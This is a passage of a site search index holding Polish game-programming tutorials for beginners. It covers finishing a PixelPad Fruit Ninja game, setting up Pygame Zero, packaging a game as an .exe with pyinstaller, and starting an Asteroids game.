text(\"GAME OVER\", 0, 0)\nself.game_over_text.color = \"#FF4365\"\nself.game_over_text.fontSize = 120\nself.game_over_text.halign = \"center\"\nself.game_over_text.valign = \"middle\"\nself.game_over_text.visible = False\n</code></pre> <p>Tekst powinni\u015bmy wy\u015bwietli\u0107, jak gra si\u0119 zako\u0144czy. Przechodzimy wi\u0119c do zak\u0142adki Loop i szukamy fragmentu, w kt\u00f3rym ustawiamy warto\u015b\u0107 zmiennej <code>game_over</code> na <code>True</code>.</p> <pre><code>if self.time &lt; 0:\n    self.game_over = True\n    self.time = 0\n</code></pre> <p>Pod spodem, wewn\u0105trz instrukcji warunkowej, zmieniamy widoczno\u015b\u0107 tekstu ko\u0144ca gry.</p> <pre><code>if self.time &lt; 0:\n    self.game_over = True\n    self.time = 0\n    self.game_over_text.visible = True\n</code></pre> <p>Teraz powinni\u015bmy zobaczy\u0107 napis GAME OVER na ekranie po zako\u0144czeniu gry.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#restart","title":"Restart","text":"<p>Gr\u0119 mo\u017cemy restartowa\u0107 r\u0119cznie, uruchamiaj\u0105c j\u0105 ponownie, ale dobrze by\u0142oby m\u00f3c to tak\u017ce zrobi\u0107 z poziomu gry. Dlatego dodamy mo\u017cliwo\u015b\u0107 restartu gry po jej zako\u0144czeniu, gdy gracz wci\u015bnie prawy przycisk myszy. Dlaczego prawy? Poniewa\u017c lewy jest u\u017cywany w rozgrywce.</p> <p>Przechodzimy do zak\u0142adki Loop w klasie <code>Game</code>. Na samym pocz\u0105tku kodu mamy instrukcj\u0119, kt\u00f3ra sprawdza, czy gra si\u0119 zako\u0144czy\u0142a.</p> <pre><code>if self.game_over:\n    return\n</code></pre> <p>Wewn\u0105trz tej instrukcji, przed wykonaniem <code>return</code>, sprawdzimy, czy naci\u015bni\u0119ty zosta\u0142 prawy przycisk myszy.</p> <pre><code>if self.game_over:\n    if mouse_is_pressed(\"right\"):\n    return\n</code></pre> <p>Je\u017celi tak jest, to ustawimy warto\u015b\u0107 <code>game_over</code> na <code>False</code>, ukryjemy tekst ko\u0144ca gry, wyzerujemy punkty oraz przywr\u00f3cimy pocz\u0105tkow\u0105 warto\u015b\u0107 licznika czasu.</p> <pre><code>if self.game_over:\n    if mouse_is_pressed(\"right\"):\n        self.time = 61\n        self.points = 0\n        self.game_over_text.visible = False\n        self.game_over = False\n    return\n</code></pre> <p>Teraz powinni\u015bmy m\u00f3c ponownie uruchomi\u0107 rozgrywk\u0119 po jej zako\u0144czeniu za pomoc\u0105 prawego przycisku myszy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#roznorodne-owoce","title":"R\u00f3\u017cnorodne owoce","text":"<p>Czas urozmaici\u0107 nasz\u0105 gr\u0119 dodaj\u0105c do niej nowe owoce. B\u0119dzie to zmiana wy\u0142\u0105cznie wizualna.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#grafiki","title":"Grafiki","text":"<p>Zaczynamy od za\u0142adowania odpowiednich grafik, zar\u00f3wno owoc\u00f3w jak i efekt\u00f3w animacji. Klikamy wi\u0119c na plusik przy Sprites i dodajemy:</p> <ul> <li>Apple - nazywamy apple</li> <li>Apple Splash - nazywamy applesplash</li> <li>Watermelon - nazywamy watermelon</li> <li>Watermelon Splash - nazywamy watermelonsplash</li> <li>Eggplant - nazywamy eggplant</li> <li>Eggplant Splash - nazywamy eggplantsplash</li> <li>Pear - nazywamy pear</li> <li>Pear Splash - nazywamy pearsplash</li> </ul> <p>Jak ju\u017c mamy dodane grafiki, to czas je za\u0142adowa\u0107. W tym celu przechodzimy do klasy <code>Fruit</code>. W kodzie inicjalizuj\u0105cym (zak\u0142adka Start) utworzymy dwie listy zawieraj\u0105ce nazwy grafik oraz odpowiadaj\u0105cych im animacji. B\u0119d\u0105 to zmienne lokalne, nazwane odpowiednio images oraz splash_images. Dodajemy na pocz\u0105tku kodu, zaraz pod importowaniem biblioteki <code>random</code>:</p> <pre><code>images = [\"orange.png\", \"apple.png\", \"watermelon.png\", \"pear.png\", \"eggplant.png\"]\nsplash_images = [\"orangesplash.png\", \"applesplash.png\", \"watermelonsplash.png\", \"pearsplash.png\", \"eggplantsplash.png\"]\n</code></pre> <p>Kolejno\u015b\u0107 element\u00f3w na listach ma znaczenie, poniewa\u017c owoc i jego animacja musz\u0105 znajdowa\u0107 si\u0119 na odpowiadaj\u0105cych sobie pozycjach w listach.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#losowanie","title":"Losowanie","text":"<p>Teraz mo\u017cemy przej\u015b\u0107 do losowania grafiki. W tym celu wylosujemy numer elementu z listy. Zaraz pod utworzonymi listami tworzymy now\u0105 zmienn\u0105 lokaln\u0105 image_num do kt\u00f3rej przypiszemy losow\u0105 warto\u015b\u0107 uzyskan\u0105 za pomoc\u0105 funkcji <code>randint</code>. B\u0119dziemy losowa\u0107 od zera do d\u0142ugo\u015bci listy minus jeden, poniewa\u017c tak numerowane s\u0105 elementy na li\u015bcie. D\u0142ugo\u015b\u0107 listy pobierzemy za pomoc\u0105 funkcji <code>len</code>.</p> <pre><code>image_num = randint(0, len(images) - 1)\n</code></pre> <p>Teraz mo\u017cemy wykorzysta\u0107 warto\u015b\u0107 zmiennej image_num do wyboru odpowiedniego obrazka z listy images. Szukamy miejsca w kodzie, gdzie ustalali\u015bmy warto\u015b\u0107 zmiennej <code>sprite</code>:</p> <pre><code>self.sprite = sprite(\"orange.png\")\n</code></pre> <p>Zamiast grafiki orange.png odwo\u0142amy si\u0119 do elementu z listy <code>images</code> pod wylosowanym indeksem:</p> <pre><code>self.sprite = sprite(images[image_num])\n</code></pre> <p>Podobnie zrobimy z animacj\u0105. Szukamy instrukcji ustawiaj\u0105cej warto\u015b\u0107 zmiennej <code>splash</code>:</p> <pre><code>splash = sprite(\"orangesplash.png\", 2, 4)\n</code></pre> <p>Zmieniamy grafik\u0119 na element listy <code>splash_images</code> pod wylosowanym indeksem:</p> <pre><code>splash = sprite(splash_images[image_num], 2, 4)\n</code></pre> <p>I to wszystko! Powinni\u015bmy ju\u017c mie\u0107 losowe owoce.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#slad","title":"\u015alad","text":"<p>Jednym z ciekawych wizualnych efekt\u00f3w jest zostawienie za sob\u0105 \u015bladu, gdy poruszamy myszk\u0105 i mamy wci\u015bni\u0119ty lewy przycisk. Teraz tym si\u0119 zajmiemy.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#klasa_4","title":"Klasa","text":"<p>Najpierw utworzymy now\u0105 klas\u0119 Trail. Klikamy wi\u0119c na plusik przy Classes i podajemy odpowiedni\u0105 nazw\u0119.</p> <p>Wewn\u0105trz klasy, w cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) za\u0142adujemy najpierw grafik\u0119, tak\u0105 sam\u0105 jak do naszego slicera:</p> <pre><code>self.sprite = sprite(\"slicer.png\")\n</code></pre> <p>Utworzymy tak\u017ce zmienn\u0105 timer przypisan\u0105 do obiektu i nadamy jej pocz\u0105tkow\u0105 warto\u015b\u0107 \\(5\\), tak by \u015blad znika\u0142 po pi\u0119ciu klatkach.</p> <pre><code>self.timer = 5\n</code></pre>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#dodawanie-sladu","title":"Dodawanie \u015bladu","text":"<p>\u015alad b\u0119dziemy dodawa\u0107 z poziomu klasy Slicer, przechodzimy wi\u0119c do niej. W cz\u0119\u015bci inicjalizuj\u0105cej (zak\u0142adka Start) utworzymy zmienn\u0105 trail_length przypisan\u0105 do obiektu, kt\u00f3ra b\u0119dzie okre\u015bla\u0142a nie tyle d\u0142ugo\u015b\u0107 pozostawianego \u015bladu, co jego dok\u0142adno\u015b\u0107. B\u0119dzie okre\u015bla\u0142a, ile kropek ma by\u0107 postawionych pomi\u0119dzy obecn\u0105 a ostatnio zapami\u0119tan\u0105 pozycj\u0105 myszki. Dopisujemy na ko\u0144cu kodu:</p> <pre><code>self.trail_length = 10\n</code></pre> <p>Teraz mo\u017cemy przej\u015b\u0107 do cz\u0119\u015bci aktualizuj\u0105cej (zak\u0142adka Loop) klasy Slicer. Na samym pocz\u0105tku kodu, przed zmian\u0105 wsp\u00f3\u0142rz\u0119dnych, zapami\u0119tamy obecne po\u0142o\u017cenie w dw\u00f3ch zmiennych lokalnych:</p> <pre><code>previousX = self.x\npreviousY = self.y\n\nself.x = mouse_x()\nself.y = mouse_y()\n</code></pre> <p>Po zmianie wsp\u00f3\u0142rz\u0119dnych natomiast wyliczymy pr\u0119dko\u015b\u0107 z jak\u0105 poruszy\u0142a si\u0119 myszka, odejmuj\u0105c od jej obecnego po\u0142o\u017cenia jej poprzednie po\u0142o\u017cenie. Wyniki zapami\u0119tamy tak\u017ce w zmiennych lokalnych.</p> <pre><code>previousX = self.x\npreviousY = self.y\n\nself.x = mouse_x()\nself.y = mouse_y()\n\nspeedX = self.x - previousX\nspeedY = self.y - previousY\n</code></pre> <p>Teraz mo\u017cemy przej\u015b\u0107 do faktycznego dodawania \u015bladu. Szukamy miejsca, w kt\u00f3rym sprawdzamy, czy lewy przycisk myszy jest klikni\u0119ty:</p> <pre><code>if mouse_is_pressed(\"left\"):\n    ...\n</code></pre> <p>Wewn\u0105trz instrukcji warunkowej, na samym pocz\u0105tku, dopiszemy dodawanie \u015bladu. \u015alad b\u0119dziemy dodawa\u0107 w p\u0119tli. Przejdziemy p\u0119tl\u0105 tyle razy, ile wynosi d\u0142ugo\u015b\u0107 \u015bladu, kt\u00f3ry chcemy zostawi\u0107:</p> <pre><code>if mouse_is_pressed(\"left\"):\n   for i in range(self.trail_length):\n    ...\n</code></pre> <p>W p\u0119tli b\u0119dziemy najpierw tworzy\u0107 nowy \u015blad (<code>Trail()</code>), kt\u00f3ry zapami\u0119tamy w lokalnej zmiennej trail:</p> <pre><code>if mouse_is_pressed(\"left\"):\n   for i in range(self.trail_length):\n        trail = Trail()\n    ...\n</code></pre> <p>Teraz pozosta\u0142o nam ustali\u0107 pozycj\u0119 nowego \u015bladu. B\u0119dzie ona zale\u017cna od poprzedniej pozycji myszy, pr\u0119dko\u015bci myszy, d\u0142ugo\u015bci \u015bladu i numeru elementu \u015bladu kt\u00f3ry w\u0142a\u015bnie dodajemy (licznik p\u0119tli):</p> <pre><code>if mouse_is_pressed(\"left\"):\n   for i in range(self.trail_length):\n        trail = Trail()\n        trail.x = previousX + speedX * i / self.trail_length\n        trail.y = previousY + speedY * i / self.trail_length\n    ...\n</code></pre> <p>Teraz mo\u017cemy uruchomi\u0107 gr\u0119 i zobaczy\u0107, jak \u015blad si\u0119 pojawia, ale nie znika.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#znikanie-sladu","title":"Znikanie \u015bladu","text":"<p>Wracamy do klasy Trail i przechodzimy do cz\u0119\u015bci aktualizacyjnej (zak\u0142adka Loop). Tutaj b\u0119dziemy zmniejsza\u0107 licznik (<code>timer</code>) o warto\u015b\u0107 up\u0142yni\u0119tych klatek animacji:</p> <pre><code>self.timer -= 60 / get_fps()\n</code></pre> <p>Nast\u0119pnie, dla lepszego efektu, b\u0119dziemy zmniejsza\u0107 rozmiar (skal\u0119) \u015bladu o wybrany procent:</p> <pre><code>self.timer -= 60 / get_fps()\n\nself.scaleX *= 0.9\nself.scaleY *= 0.9\n</code></pre> <p>Na koniec, gdy licznik spadnie do zera, usuniemy fragment \u015bladu z gry:</p> <pre><code>self.timer -= 60 / get_fps()\n\nself.scaleX *= 0.9\nself.scaleY *= 0.9\n\nif self.timer &lt;= 0:\n    destroy(self)\n</code></pre> <p>I to tyle! \u015alad powinien teraz \u0142adnie pojawia\u0107 si\u0119 i znika\u0107 po czasie.</p>"},{"location":"learning-by-games/python/pixelpad/fruit-ninja/#skonczona-gra","title":"Sko\u0144czona gra","text":"<p>Pe\u0142en kod gry mo\u017cna znale\u017a\u0107 pod adresem https://pixelpad.io/app/pcsoedfirjh/?edit=1.</p>"},{"location":"learning-by-games/python/pygame-zero/","title":"Gry 2D - Pygame Zero","text":"<p>Poznali\u015bmy ju\u017c niezb\u0119dne podstawy programowania w j\u0119zyku Python, pora wi\u0119c przej\u015b\u0107 do tworzenia bardziej interaktywnych gier dwuwymiarowych. W tym kursie wykorzystamy jedn\u0105 z bibliotek do tworzenia takich gier: PyGame Zero.</p> <p>Ci z Was, kt\u00f3rzy interesuj\u0105 si\u0119 tworzeniem gier mogli ju\u017c wcze\u015bniej s\u0142ysze\u0107 o bibliotece PyGame, jednej z najpopularniejszych do tworzenia gier w j\u0119zyku Python. PyGame Zero jest \"uproszczon\u0105\" wersj\u0105 tej biblioteki, idealn\u0105 do rozpocz\u0119cia nauki tego pi\u0119knego j\u0119zyka. Nie jest ona cz\u0119\u015bci\u0105 domy\u015blnej instalacji j\u0119zyka Python, musimy wi\u0119c j\u0105 samodzielnie zainstalowa\u0107.</p>"},{"location":"learning-by-games/python/pygame-zero/#pygame-zero","title":"Pygame Zero","text":"<p>Pygame Zero to biblioteka dla Pythona, przeznaczona do tworzenia gier. Jest to \"zerowy wysi\u0142ek\" dla u\u017cytkownik\u00f3w, co oznacza, \u017ce jest prosta w u\u017cyciu i nie wymaga instalacji dodatkowych narz\u0119dzi. Pygame Zero jest nak\u0142adk\u0105 na bibliotek\u0119 Pygame, ale jest prostsza i bardziej dost\u0119pna dla pocz\u0105tkuj\u0105cych.</p> <p>Pygame Zero</p>"},{"location":"learning-by-games/python/pygame-zero/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>\u0141atwo\u015b\u0107 u\u017cycia: Pygame Zero zosta\u0142o zaprojektowane z my\u015bl\u0105 o prostocie. Jest doskona\u0142ym narz\u0119dziem dla pocz\u0105tkuj\u0105cych programist\u00f3w i os\u00f3b ucz\u0105cych si\u0119 programowania gier.</p> </li> <li> <p>Prosta instalacja: Pygame Zero jest dost\u0119pne jako pakiet Pythona, co oznacza, \u017ce mo\u017cna go \u0142atwo zainstalowa\u0107 za pomoc\u0105 narz\u0119dzi do zarz\u0105dzania pakietami Pythona, takich jak pip.</p> </li> <li> <p>Wsparcie dla wielu rodzaj\u00f3w gier: Pygame Zero obs\u0142uguje wiele rodzaj\u00f3w gier, w tym gry 2D i gry zr\u0119czno\u015bciowe. Oferuje podstawowe narz\u0119dzia do obs\u0142ugi grafiki, d\u017awi\u0119ku i interakcji z u\u017cytkownikiem.</p> </li> <li> <p>Bezpo\u015brednie mapowanie z Pygame: Pygame Zero jest nak\u0142adk\u0105 na Pygame, co oznacza, \u017ce je\u015bli u\u017cytkownik chce zrobi\u0107 co\u015b bardziej zaawansowanego, mo\u017ce \u0142atwo przej\u015b\u0107 do korzystania z funkcji Pygame.</p> </li> </ol> <p>Pygame Zero jest doskona\u0142ym narz\u0119dziem do nauki programowania gier dla pocz\u0105tkuj\u0105cych, a tak\u017ce dla nauczycieli, kt\u00f3rzy chc\u0105 wprowadzi\u0107 swoich uczni\u00f3w w \u015bwiat tworzenia gier. Jest \u0142atwy w u\u017cyciu, a jednocze\u015bnie oferuje wystarczaj\u0105co du\u017co mo\u017cliwo\u015bci, aby umo\u017cliwi\u0107 tworzenie interesuj\u0105cych i zabawnych gier.</p>"},{"location":"learning-by-games/python/pygame-zero/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Instalacji bibliotek.</li> <li>Zasady dzia\u0142ania podstawowego szablonu PygameZero.</li> <li>Podzia\u0142u kodu na cz\u0119\u015bci/podprogramy (funkcje).</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/#instalacja-biblioteki","title":"Instalacja biblioteki","text":"<p>Na dole ekranu programu PyCharm szukamy zak\u0142adki Terminal. Otwieramy j\u0105 i w oknie, kt\u00f3re si\u0119 pojawi wpisujemy nast\u0119puj\u0105ce polecenie:</p> <p><code>pip install pgzero</code></p> <p>Zatwierdzamy je przyciskiem Enter i czekamy a\u017c biblioteka si\u0119 zainstaluje.</p>"},{"location":"learning-by-games/python/pygame-zero/#szablon","title":"Szablon","text":"<p>Na samym pocz\u0105tku utworzymy bardzo prosty szablon. B\u0119dziemy z niego wielokrotnie korzysta\u0107 przy tworzeniu naszych gier. Tak naprawd\u0119, praktycznie zawsze b\u0119dziemy od tego w\u0142a\u015bnie zaczyna\u0107.</p> <p>Tworzymy nowy plik o nazwie <code>szablon.py</code>, kt\u00f3ry zaraz wype\u0142nimy tre\u015bci\u0105.</p>"},{"location":"learning-by-games/python/pygame-zero/#importujemy-biblioteke","title":"Importujemy bibliotek\u0119","text":"<p>Na pocz\u0105tku importujemy zainstalowan\u0105 bibliotek\u0119, a dok\u0142adnie jej konkretny modu\u0142: pgzrun. Pozwoli on nam uruchamia\u0107 tworzone gry.</p> <pre><code>import pgzrun\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/#okreslamy-wymiary-okna-gry","title":"Okre\u015blamy wymiary okna gry","text":"<p>Na pocz\u0105tek okre\u015blamy wymiary okna naszej gry. Zacznijmy klasycznie od wymiar\u00f3w \\(800\\times600\\). W zale\u017cno\u015bci od zapotrzebowania b\u0119dziemy te wymiary dostosowywa\u0107 do konkretnych gier.</p> <p>Wymiary okre\u015blamy podaj\u0105c szeroko\u015b\u0107 (ang. width) i wysoko\u015b\u0107 (ang. height) okna gry. Wa\u017cne jest, \u017ceby nazwy zmiennych by\u0142y w tym wypadku napisane drukowanymi literami.</p> <pre><code>WIDTH = 800\nHEIGHT = 600\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/#tworzymy-czesc-rysujaca","title":"Tworzymy cz\u0119\u015b\u0107 rysuj\u0105c\u0105","text":"<p>Jedn\u0105 z najwa\u017cniejszych cz\u0119\u015bci ka\u017cdej gry jest cz\u0119\u015b\u0107 rysuj\u0105ca, w kt\u00f3rej b\u0119dziemy okre\u015bla\u0107, co ma zosta\u0107 wy\u015bwietlone na ekranie. Dopiero zaczynamy i nie mamy jeszcze nic do narysowania, dlatego dodajemy polecenie pass, kt\u00f3re okre\u015bla, \u017ce mamy spasowa\u0107, czyli nic nie robi\u0107.</p> <pre><code>def draw():\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/#tworzymy-czesc-aktualizujaca","title":"Tworzymy cz\u0119\u015b\u0107 aktualizuj\u0105c\u0105","text":"<p>Drug\u0105 kluczow\u0105 cz\u0119\u015bci\u0105 ka\u017cdej gry jest cz\u0119\u015b\u0107 aktualizuj\u0105ca (ang. update). Podobnie jak wcze\u015bniej, nie mamy jeszcze nic do aktualizacji, wi\u0119c tutaj tak\u017ce dodajemy pass.</p> <pre><code>def update():\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/#dodajemy-polecenie-uruchamiajace-gre","title":"Dodajemy polecenie uruchamiaj\u0105ce gr\u0119","text":"<p>Na samym ko\u0144cu naszego kodu dodajemy polecenie, kt\u00f3re uruchomi nasz\u0105 gr\u0119. To polecenie powinno zawsze znajdowa\u0107 si\u0119 na ko\u0144cu kodu.</p> <pre><code>pgzrun.go()\n</code></pre> <p>I to wszystko! Teraz mo\u017cemy przej\u015b\u0107 do testowania.</p>"},{"location":"learning-by-games/python/pygame-zero/#peen-program-z-komentarzami","title":"Pe\u0142en program z komentarzami","text":"<pre><code># Korzystamy z biblioteki do tworzenia gier: PyGame Zero\nimport pgzrun\n\n# Okre\u015blamy szeroko\u015b\u0107 i wysoko\u015b\u0107 okna gry\nWIDTH = 800\nHEIGHT = 600\n\n# Tutaj b\u0119dziemy rysowa\u0107 wszystko na ekranie\ndef draw():\n    pass\n\n# Tutaj b\u0119dziemy aktualizowa\u0107 stan gry: przyznawa\u0107 punkty, porusza\u0107 postaciami itd.\ndef update():\n    pass\n\n# Uruchamiamy gr\u0119\npgzrun.go()\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/#testujemy-dziaanie","title":"Testujemy dzia\u0142anie","text":"<p>Teraz czas uruchomi\u0107 nasz\u0105 \"gr\u0119\". Post\u0119pujemy standardowo: prawy przycisk myszy w edytorze -&gt; Run 'szablon'. Naszym oczom powinien ukaza\u0107 si\u0119 pi\u0119kny, czarny ekran o wymiarach \\(800\\) na \\(600\\) pikseli. \u015awietnie!</p> <p>Efekt mo\u017ce nie jest bardzo satysfakcjonuj\u0105cy, ale to oznacza, \u017ce biblioteka zainstalowana zosta\u0142a poprawnie i mo\u017cemy przej\u015b\u0107 do tworzenia naszych gier!</p>"},{"location":"learning-by-games/python/pygame-zero/#petla-gry","title":"P\u0119tla gry","text":"<p>Gra dzia\u0142a w niesko\u0144czonej, ukrytej p\u0119tli. Przez ca\u0142y czas, od uruchomienia a\u017c do zako\u0144czenia gry wykonywane s\u0105 dwie g\u0142\u00f3wne akcje: rysowanie i aktualizacja. Nazywamy to p\u0119tl\u0105 gry. Co ka\u017cd\u0105 klatk\u0119 animacji aktualizowane s\u0105 pozycje graczy, ich interakcja z graczem i sob\u0105 nawzajem, \u017cycia przeciwnik\u00f3w, punkty itp. Og\u00f3lnie aktualizowany jest stan gry. Wszystkie te zmiany s\u0105 tak\u017ce nanoszone na ekran, czyli rysowane w oknie gry.</p>"},{"location":"learning-by-games/python/pygame-zero/#dla-zaawansowanych-plik-exe","title":"Dla zaawansowanych: plik .exe","text":"<p>Standardowo do uruchomienia naszych gier potrzebny b\u0119dzie Python, wraz z zainstalowan\u0105 bibliotek\u0105 pgzero. Naturalnym jednak jest, \u017ce chcemy si\u0119 pochwali\u0107 innym naszymi grami! Nie wszystkim b\u0119dzie jednak \u0142atwo wyt\u0142umaczy\u0107, jak zainstalowa\u0107 Pythona i uruchomi\u0107 nasz\u0105 gr\u0119. Dlatego potrzebny nam jest plik wykonywalny: taki, kt\u00f3ry wystarczy uruchomi\u0107 na innym komputerze i wszystko b\u0119dzie dzia\u0142a\u0107, nawet bez Pythona! Pytanie brzmi: jak taki plik utworzy\u0107?  Potrzebne b\u0119d\u0105 nam dwie rzeczy: biblioteka pyinstaller oraz kr\u00f3tki skrypt.</p>"},{"location":"learning-by-games/python/pygame-zero/#instalacja-biblioteki_1","title":"Instalacja biblioteki","text":"<p>Na dole ekranu programu PyCharm szukamy zak\u0142adki Terminal. Otwieramy j\u0105 i w oknie, kt\u00f3re si\u0119 pojawi wpisujemy nast\u0119puj\u0105ce polecenie:</p> <p><code>pip install pyinstaller</code></p> <p>Zatwierdzamy je przyciskiem Enter i czekamy a\u017c biblioteka si\u0119 zainstaluje.</p>"},{"location":"learning-by-games/python/pygame-zero/#skrypt","title":"Skrypt","text":"<p>W katalogu g\u0142\u00f3wnym naszego projektu tworzymy nowy plik o nazwie setup.bat (prawy przycisk na g\u0142\u00f3wny katalog projektu, a nast\u0119pnie New -&gt; File). W pliku wpisujemy:</p> <pre><code>pyinstaller --collect-all pgzero main.py --distpath . --add-data \"images;images\" --add-data \"fonts;fonts\" --add-data \"sounds;sounds\" --add-data \"music;music\" --onefile --noconfirm --windowed --clean\n</code></pre> <p>Warning</p> <p>Skrypt nale\u017cy dostosowa\u0107 do naszego projektu, a konkretnie do katalog\u00f3w, jakich u\u017cywamy. Powy\u017cszy skrypt b\u0119dzie dzia\u0142a\u0142, je\u017celi nasza gra u\u017cywa: - grafik (<code>--add-data \"images;images\"</code>), - czcionek (<code>--add-data \"fonts;fonts\"</code>), - efekt\u00f3w d\u017awi\u0119kowych (<code>--add-data \"sounds;sounds\"</code>), - muzyki (<code>--add-data \"music;music\"</code>).</p> <p>Je\u017celi nie mamy kt\u00f3rego\u015b z katalog\u00f3w w naszym projekcie, to ze skryptu nale\u017cy usun\u0105\u0107 odpowiednie polecenie. Np. je\u017celi nasza gra korzysta tylko z grafik, to skrypt powinien wygl\u0105da\u0107 tak: <pre><code>pyinstaller --collect-all pgzero main.py --distpath . --add-data \"images;images\" --onefile --noconfirm --windowed --clean\n</code></pre></p>"},{"location":"learning-by-games/python/pygame-zero/#tworzymy-plik-wykonywalny","title":"Tworzymy plik wykonywalny","text":"<p>W zak\u0142adce Terminal uruchamiamy plik setup.bat wpisuj\u0105c <code>.\\setup.bat</code> i zatwierdzaj\u0105c przyciskiem Enter. Teraz wystarczy poczeka\u0107, a\u017c operacje si\u0119 zako\u0144cz\u0105.  Po wszystkim zostanie utworzony w g\u0142\u00f3wnym katalogu naszej gry plik main.exe, kt\u00f3ry mo\u017cemy uruchomi\u0107, a tak\u017ce przekaza\u0107 znajomym, by i oni mogli zagra\u0107 w nasz\u0105 gr\u0119!</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/","title":"Asteroidy","text":""},{"location":"learning-by-games/python/pygame-zero/asteroids/#wstep","title":"Wst\u0119p","text":"<p>Kosmos, statki kosmiczne, asteroidy, lasery: tym si\u0119 w\u0142a\u015bnie dzi\u015b zajmiemy! Stworzymy nasz\u0105 pierwsz\u0105 gr\u0119 kosmiczn\u0105!</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#czego-sie-nauczysz","title":"Czego si\u0119 nauczysz","text":"<ul> <li>Pracy z listami.</li> <li>Dodawania nowych element\u00f3w do gry w trakcie jej dzia\u0142ania.</li> <li>Usuwania element\u00f3w gry w trakcie jej dzia\u0142ania.</li> <li>Odczytywania pozycji myszki.</li> <li>Planowania wykonania akcji z op\u00f3\u017anieniem.</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#grafiki-do-pobrania","title":"Grafiki do pobrania","text":"<p> Grafiki do gry Asteroidy</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#dzwieki-do-pobrania","title":"D\u017awi\u0119ki do pobrania","text":"<p> D\u017awi\u0119ki do gry Asteroidy</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#muzyka-do-pobrania","title":"Muzyka do pobrania","text":"<p> Muzyka do gry Asteroidy</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#zroda","title":"\u0179r\u00f3d\u0142a","text":"<ul> <li>https://kenney.nl/</li> </ul>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#nasz-cel","title":"Nasz cel","text":"<p>Za\u0142o\u017cenie gry jest proste: poruszamy statkiem u do\u0142u ekranu, omijamy asteroidy, strzelamy do nich i zdobywamy punkty! Powy\u017csza animacja pokazuje, jak b\u0119dzie wygl\u0105da\u0107 nasza gra.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#wstepna-konfiguracja","title":"Wst\u0119pna konfiguracja","text":"<p>Zaczynamy standardowo: tworzymy nowy projekt, instalujemy bibliotek\u0119, pobieramy materia\u0142y i umieszczamy je w odpowiednich miejscach. Nasz projekt mo\u017cemy nazwa\u0107 np. \"Asteroids\" albo \"Asteroidy\". Gdy ju\u017c utworzymy projekt, tworzymy w nim nowe katalogi images, sounds oraz music. Nast\u0119pnie pobieramy wy\u017cej wymienione materia\u0142y, rozpakowujemy je, a zawarto\u015b\u0107 przerzucamy do odpowiednich katalog\u00f3w. Pozosta\u0142o nam jeszcze zainstalowa\u0107 bibliotek\u0119: w okienku terminala wypisujemy standardowo polecenie <code>pip install pgzero</code>.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#podstawowy-szablon","title":"Podstawowy szablon","text":""},{"location":"learning-by-games/python/pygame-zero/asteroids/#biblioteki","title":"Biblioteki","text":"<p>Na pocz\u0105tek dopisujemy odpowiednie biblioteki do naszej gry. Tym razem, poza standardowymi, b\u0119dziemy jeszcze potrzebowali biblioteki pygame, \u017ceby m\u00f3c odczyta\u0107 pozycj\u0119 myszy na ekranie, a tak\u017ce \u017ceby m\u00f3c ukry\u0107 wska\u017anik myszy.</p> <pre><code>import pgzrun\nimport pygame\nimport random\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#przygotowujemy-ekran-gry","title":"Przygotowujemy ekran gry","text":"<p>Na pocz\u0105tek ustalamy rozmiar okna i wy\u015bwietlamy t\u0142o naszej gry z grafiki bg.png za pomoc\u0105 funkcji <code>screen.blit</code> w cz\u0119\u015bci rysuj\u0105cej draw. Rozmiar okna powinien by\u0107 zgodny z rozmiarem grafiki t\u0142a, tzn. \\(600\\times900\\).</p> <pre><code>WIDTH = 600\nHEIGHT = 900\n\ndef draw():\n    screen.blit(\"bg\", (0, 0))\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#aktualizacja","title":"Aktualizacja","text":"<p>Potrzebna jest nam jeszcze funkcja update, kt\u00f3r\u0105 standardowo umieszczamy pod funkcj\u0105 draw i wpisujemy w niej jedn\u0105 instrukcj\u0119: pass.</p> <pre><code>def update():\n    pass\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#uruchomienie-gry","title":"Uruchomienie gry","text":"<p>Na ko\u0144cu naszego kodu dopisujemy instrukcj\u0119 <code>pgzrun.go()</code> uruchamiaj\u0105c\u0105 nasz\u0105 gr\u0119.</p>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#peny-kod","title":"Pe\u0142ny kod","text":"<pre><code>import pgzrun\nimport pygame\nimport random  # Biblioteka do liczb losowych\n\nWIDTH = 600  # Ustawiamy szeroko\u015b\u0107 okna gry\nHEIGHT = 900  # Ustawiamy wysoko\u015b\u0107 okna gry\n\ndef draw():  # Funkcja rysuj\u0105ca elementy gry\n    screen.blit(\"bg\", (0, 0))  # Rysujemy t\u0142o gry\n\ndef update():  # Funkcja aktualizuj\u0105ca elementy gry\n    pass\n\npgzrun.go()  # Uruchamiamy gr\u0119\n</code></pre>"},{"location":"learning-by-games/python/pygame-zero/asteroids/#statek","title":"Statek","text":"<p>G\u0142\u00f3wnym aktorem naszej gry, w kt\u00f3rego wcieli si\u0119 gracz, b\u0119dzie statek kosmiczny. B\u0119dziemy go wy\u015bwietla\u0107 na dole ekranu i porusza\u0107 na boki za 